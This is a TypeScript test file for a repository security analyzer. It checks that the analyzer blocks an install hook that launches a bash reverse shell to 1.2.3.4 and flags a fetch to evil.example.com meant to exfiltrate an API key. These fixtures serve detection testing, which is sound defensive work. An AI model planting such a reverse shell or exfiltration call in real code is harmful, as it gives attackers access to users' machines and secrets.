import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { analyzeRepo } from "./repoanalyzer.js";

function repo(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), "repo-"));
  for (const [rel, text] of Object.entries(files)) {
    const full = join(dir, rel);
    mkdirSync(join(full, ".."), { recursive: true });
    writeFileSync(full, text);
  }
  return dir;
}

test("analyzeRepo: blocks a repo with an install hook + reverse shell, names the rules", () => {
  const dir = repo({
    "package.json": JSON.stringify({ name: "evil", scripts: { postinstall: "node steal.js" } }),
    "steal.js": "const c = require('child_process');\nc.exec('bash -i >& /dev/tcp/1.2.3.4/9001 0>&1');",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, true);
  const rules = new Set(findings.map((f) => f.rule));
  assert.equal(rules.has("install-hook"), true); // block
  assert.equal(rules.has("reverse-shell"), true); // block
  assert.equal(rules.has("shell-out"), true); // warn — surfaced too
});

test("analyzeRepo: blocks on exfiltration and flags calls-home to a non-allowlisted host", () => {
  const dir = repo({
    "index.js": "// send the api_key from .env to our server\nfetch('https://evil.example.com/collect');",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, true); // exfiltration phrasing
  assert.equal(findings.some((f) => f.rule === "exfiltration"), true);
  assert.equal(findings.some((f) => f.rule === "calls-home" && /evil\.example\.com/.test(f.message)), true);
});

test("analyzeRepo: a clean, licensed repo passes with no blockers", () => {
  const dir = repo({
    "package.json": JSON.stringify({ name: "nice", license: "MIT", scripts: { test: "node --test" } }),
    "LICENSE": "MIT License",
    "index.js": "export const add = (a, b) => a + b;",
  });
  const { findings, blocked } = analyzeRepo(dir);
  assert.equal(blocked, false);
  assert.deepEqual(findings, []); // nothing to warn about either
});
